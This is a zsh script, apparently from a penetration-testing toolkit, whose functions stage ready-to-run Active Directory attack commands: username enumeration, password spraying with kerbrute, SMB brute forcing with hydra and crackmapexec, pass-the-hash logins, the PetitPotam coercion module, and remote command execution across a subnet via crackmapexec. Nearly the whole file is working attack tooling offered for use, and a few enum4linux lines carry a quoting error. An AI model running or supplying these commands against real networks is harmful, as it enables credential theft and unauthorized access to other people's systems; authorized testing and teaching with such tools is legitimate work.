#!/usr/bin/env zsh

############################################################# 
# nb-ad-enum
#############################################################
nb-ad-enum-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-enum
------------
The nb-ad-enum namespace contains commands for enumerating and exploiting Active Directory server.

Brute Force Attacks
-------------------
nb-ad-enum-brute-hydra                brute force password/login for a user account with hydra
nb-ad-enum-brute-cme                  brute force password/login for a user account with cme
nb-ad-enum-pass-spray                 perform password spraying

Initial Passive Enumeration
---------------------------
nb-ad-enum-responder                 starts responder with passive analysis mode enabled (passively listen to the network)
nb-ad-enum-fping                     fping active checks to validates which hosts are active on a network subnet

Enumerating Users
====================================
NULL Session
------------
nb-ad-enum-kerbrute-users            use kerbrute to brute force valid usernames 
nb-ad-enum-null-getadusers           use GetADUsers.py to enumerate valid usernames
nb-ad-enum-null-cme-users            use crackmapexec to enumerate valid usernames
nb-ad-enum-null-cme-rid              use crackmapexec to enumerate valid usernames by rid bruteforcing
nb-ad-enum-null-lookupsid            use lookupsid.py to brute force sids of valid accounts
nb-ad-enum-null-enum4-users          dump users list using enum4linux
nb-ad-enum-null-cme-pass-pol         use crackmapexec to retrieve password policy

AUTH Session
------------
nb-ad-enum-auth-getadusers           use GetADUsers.py to enumerate valid usernames
nb-ad-enum-auth-cme-users            use crackmapexec with authentication to enumerate valid usernames
nb-ad-enum-auth-cme-rid              use crackmapexec to enumerate valid usernames by rid bruteforcing
nb-ad-enum-auth-lookupsid            use lookupsid.py to brute force sids of valid accounts
nb-ad-enum-auth-enum4-users          dump users list using enum4linux
nb-ad-enum-auth-cme-pass-pol         use crackmapexec to retrieve password policy

Authenticated Domain Enumeration
--------------------------------
nb-ad-enum-auth-cme-groups           use crackmapexec with authentication to enumerate domain groups
nb-ad-enum-auth-cme-loggedon         use crackmapexec with authentication to enumerate logged-on users
nb-ad-enum-auth-ldapdomaindump       enumerate with ldapdomaindump
nb-ad-enum-auth-bloodhound           enumerate with bloodhound
nb-ad-enum-auth-cme-pass             pass the password/hash
nb-ad-enum-auth-cme-petipotam        use crackmapexec petipotam module
nb-ad-enum-auth-cme-command          the password/hash and execute command

DOC
}

nb-ad-enum-null-enum4-users() {
    __check-project
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    print -z "enum4linux -U ${__DCHOST} | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__dcpath)/enum4linux-user-enum.txt"
}

nb-ad-enum-auth-enum4-users() {
    __check-project
    nb-vars-set-user
    nb-vars-set-pass

	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    print -z "enum4linux -u ${__USER} -p ${__PASS} -U ${__DCHOST} | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__dcpath)/enum4linux-user-enum.txt"
}

nb-ad-enum-null-cme-users() {
    __check-project
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    print -z "crackmapexec smb ${__DCHOST} -u '' -p '' --users | tee $(__dcpath)/cme-users-enum.txt"
}

nb-ad-enum-null-cme-rid() {
    __check-project
    nb-vars-set-rhost

    print -z "crackmapexec smb ${__RHOST} -u '' -p '' --rid-brute | tee $(__hostpath)/cme-rid-brute.txt"
}

nb-ad-enum-auth-lookupsid() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass

    print -z "lookupsid.py ${__USER}:${__PASS}@${__RHOST}"
}

nb-ad-enum-null-lookupsid() {
    __check-project
    nb-vars-set-rhost

    print -z "lookupsid.py -no-pass ${__RHOST}"
}

nb-ad-enum-auth-cme-rid() {
    __check-project
    nb-vars-set-user
    nb-vars-set-rhost

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --rid-brute | tee $(__hostpath)/cme-rid-brute.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --rid-brute | tee $(__hostpath)/cme-rid-brute.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth --rid-brute | tee $(__hostpath)/cme-rid-brute.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-getadusers() {
    __check-project
    nb-vars-set-domain
    nb-vars-set-user
    nb-vars-set-pass

	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    print -z "GetADUsers.py -all ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__DCHOST} -outputfile $(__dcpath)/adusers.txt"
}

nb-ad-enum-null-getadusers() {
    __check-project

	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    print -z "GetADUsers.py -all -dc-ip ${__DCHOST} -debug -outputfile $(__dcpath)/adusers.txt"
}

nb-ad-enum-auth-cme-users() {
    __check-project
    nb-vars-set-user
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --users | tee $(__dcpath)/cme-users-enum.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -p '${__PASS}' --users | tee $(__dcpath)/cme-users-enum.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -H ${__HASH} --local-auth --users | tee $(__dcpath)/cme-users-enum.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-cme-groups() {
    __check-project
    nb-vars-set-user
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --groups | tee $(__dcpath)/cme-groups-enum.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -p '${__PASS}' --groups | tee $(__dcpath)/cme-groups-enum.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -H ${__HASH} --local-auth --groups | tee $(__dcpath)/cme-groups-enum.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-cme-loggedon() {
    __check-project
    nb-vars-set-user
    nb-vars-set-network

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --loggedon-users | tee $(__netpath)/cme-loggedon-enum.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-cme-pass-pol() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --pass-pol | tee $(__hostpath)/cme-pass-pol.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --pass-pol | tee $(__hostpath)/cme-pass-pol.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth --pass-pol | tee $(__hostpath)/cme-pass-pol.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-null-cme-pass-pol() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user

    __ask "Do you want to add a domain? (y/n)"
    local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

    if [[ $add_domain == "y" ]]; then
        __ask "Enter the domain"
        nb-vars-set-domain
        print -z "crackmapexec smb ${__RHOST} -u '' -d ${__DOMAIN} -p '' --pass-pol | tee $(__hostpath)/cme-pass-pol.txt"
    else
        print -z "crackmapexec smb ${__RHOST} -u '' -p '' --pass-pol | tee $(__hostpath)/cme-pass-pol.txt"
    fi
}

nb-ad-enum-kerbrute-users() {
    __check-project
    nb-vars-set-domain
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    __ask "Do you wanna manually specify wordlists? (y/n)"
    local sw && __askvar sw "SPECIFY_WORDLIST"

    if [[ $sw == "y" ]]; then
      __ask "Select a user list"
      __askpath ul FILE $HOME/desktop/projects/

      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc ${__DCHOST} $ul -o $(__dcpath)/kerbrute-user-enum.txt"
    else
      nb-vars-set-wordlist
      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc ${__DCHOST} ${__WORDLIST} -o $(__dcpath)/kerbrute-user-enum.txt"
    fi
}

nb-ad-enum-fping() {
    __check-project
    __ask "Specify also a CIDR subnet mask e.g. /23"
    nb-vars-set-network
    print -z "fping -asgq ${__NETWORK} | tee $(__netpath)/fping-check.txt"
}

nb-ad-enum-responder() {
    __check-project
    nb-vars-set-iface
    print -z "sudo responder -I ${__IFACE} -A"
}

nb-ad-enum-install() {
    __info "Running $0..."
    __pkgs bloodhound neo4j bloodhound.py
}

nb-ad-enum-auth-ldapdomaindump() {
    __check-project
	  nb-vars-set-domain
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost
    __ask "Enter a user account"
    nb-vars-set-user
    __ask "Enter a password for authentication"
    nb-vars-set-pass

    print -z "ldapdomaindump ${__DCHOST} -u '${__DOMAIN}\\\\${__USER}' -p '${__PASS}' -o $(__dcpath)/ldapdomaindump"
}

nb-ad-enum-auth-bloodhound() {
    __check-project
	  nb-vars-set-domain
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost
    __ask "Enter a user account"
    nb-vars-set-user
    __ask "Enter a password for authentication"
    nb-vars-set-pass
    __info "Output will be saved in 'bloodhound' directory"
    __info "Now you can zip the .json files together to upload to bloodhound:"
    __ok "  zip -r bloodhound-data.zip *.json"

    #pushd $(__netpath) &> /dev/null
    print -z "sudo bloodhound-python -d ${__DOMAIN} -u ${__USER} -p '${__PASS}' -ns ${__DCHOST} -c all"
    #popd &> /dev/null
}

nb-ad-enum-auth-cme-pass() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netpath)/cme-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-cme-command() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Enter command to execute"
    local cm && __askvar cm "COMMAND"

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x $cm | tee $(__netpath)/cme-command-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x $cm | tee $(__netpath)/cme-command-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netpath)/cme-command-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-auth-cme-petipotam() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M petipotam | tee $(__netpath)/cme-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M petipotam | tee $(__netpath)/cme-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M petipotam | tee $(__netpath)/cme-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-enum-brute-hydra() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Is the service running on default port? (y/n)"
    local df && __askvar df "DEFAULT_PORT"

    if [[ $df == "n" ]]; then
      __ask "Enter port number"
      local pn && __askvar pn "PORT_NUMBER"
    fi

    if [[ $login == "p" ]]; then
      nb-vars-set-user
      if [[ $df == "n" ]]; then
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "l" ]]; then
      nb-vars-set-wordlist
      nb-vars-set-pass
      if [[ $df == "n" ]]; then
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "b" ]]; then
      __ask "Do you wanna manually specify wordlists? (y/n)"
      local sw && __askvar sw "SPECIFY_WORDLIST"
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/

        if [[ $df == "n" ]]; then
          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      else
        nb-vars-set-wordlist
        if [[ $df == "n" ]]; then
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-ad-enum-pass-spray() {
    __check-project
    nb-vars-set-domain

	  __ask "Enter the IP address of the target DC controller"
    nb-vars-set-dchost

    __ask "Select a user list"
    __askpath ul FILE $HOME/desktop/projects/

	  __ask "Enter the password for spraying"
    local pw && __askvar pw PASSWORD

    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc ${__DCHOST} $ul $pw -o $(__dcpath)/kerbrute-password-spray.txt"
}

nb-ad-enum-brute-cme() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Do you want to add a domain? (y/n)"
    local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

    __ask "Do you wanna manually specify wordlists? (y/n)"
    local sw && __askvar sw "SPECIFY_WORDLIST"

    if [[ $login == "p" ]]; then
      if [[ $sw == "y" ]]; then
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/
        nb-vars-set-user

        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      else
        nb-vars-set-passlist
        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      fi
    elif [[ $login == "l" ]]; then
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        nb-vars-set-pass

        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      else
        nb-vars-set-wordlist
        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      fi
    elif [[ $login == "b" ]]; then
      if [[ $sw == "y" ]]; then
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/

        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      else
        nb-vars-set-wordlist
        nb-vars-set-passlist
        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}
